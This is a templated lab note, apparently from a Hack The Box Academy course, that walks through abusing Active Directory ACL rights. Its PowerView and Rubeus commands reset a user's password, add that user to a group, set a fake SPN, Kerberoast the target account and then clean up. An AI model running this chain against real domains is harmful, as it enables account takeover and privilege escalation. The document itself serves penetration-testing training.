# Section 21: ACL Abuse Tactics

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1486
- Code/command blocks: 14

> Terminal output is omitted; only commands & scripts are captured.

## Goal: chain ACL rights up to a privileged account

**Start with:** valid creds for `{{USERNAME}}` (password `{{PASSWORD}}`) — a low-priv account that ACL enum ([20](20-acl-enumeration.md)) showed holds a right over the next principal. You do **not** yet control `{{NEXT_USER}}` or `{{TARGET_USER}}`.

**The chain** (each link discovered in [20](20-acl-enumeration.md)):

```
{{USERNAME}}  --ForceChangePassword-->  {{NEXT_USER}}  --AddMember-->  {{GROUP_NAME}}  --GenericWrite-->  {{TARGET_USER}}
 (you have)                              (reset its pw)                (add self)                        (set SPN + roast)
```

**Steps:**
1. Use `{{USERNAME}}`'s **ForceChangePassword** to reset `{{NEXT_USER}}`'s password → you now control `{{NEXT_USER}}`.
2. Use `{{NEXT_USER}}`'s **AddMember** right to add it to `{{GROUP_NAME}}` → inherit the group's rights.
3. Use the group's **GenericWrite** over `{{TARGET_USER}}` to set a fake SPN, **Kerberoast** it, and crack offline → `{{TARGET_USER}}`'s password.
4. **Cleanup:** clear the SPN and remove the group membership.

**End with:** cracked creds for `{{TARGET_USER}}` — the privileged account at the end of the chain (often DCSync-capable → path to Domain Admin, see [22](22-dcsync.md)).

```powershell
$SecPassword = ConvertTo-SecureString '{{PASSWORD}}' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('{{DOMAIN_NB}}\{{USERNAME}}', $SecPassword)
```

```powershell
$userPassword = ConvertTo-SecureString '{{PASSWORD}}!' -AsPlainText -Force
```

```powershell
cd C:\Tools\
PS C:\htb> Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity {{NEXT_USER}} -AccountPassword $userPassword -Credential $Cred -Verbose
```

```powershell
$SecPassword = ConvertTo-SecureString '{{PASSWORD}}!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('{{DOMAIN_NB}}\{{NEXT_USER}}', $SecPassword)
```

```powershell
Get-ADGroup -Identity "{{GROUP_NAME}}" -Properties * | Select -ExpandProperty Members
```

```powershell
Add-DomainGroupMember -Identity '{{GROUP_NAME}}' -Members '{{NEXT_USER}}' -Credential $Cred2 -Verbose
```

```powershell
Get-DomainGroupMember -Identity "{{GROUP_NAME}}" | Select MemberName
```

```powershell
Set-DomainObject -Credential $Cred2 -Identity {{TARGET_USER}} -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

```powershell
.\Rubeus.exe kerberoast /user:{{TARGET_USER}} /nowrap
```

```powershell
Set-DomainObject -Credential $Cred2 -Identity {{TARGET_USER}} -Clear serviceprincipalname -Verbose
```

```powershell
Remove-DomainGroupMember -Identity "{{GROUP_NAME}}" -Members '{{NEXT_USER}}' -Credential $Cred2 -Verbose
```

```powershell
Get-DomainGroupMember -Identity "{{GROUP_NAME}}" | Select MemberName |? {$_.MemberName -eq '{{NEXT_USER}}'} -Verbose
```

```powershell
ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506; <SNIP long argument/line truncated>
```
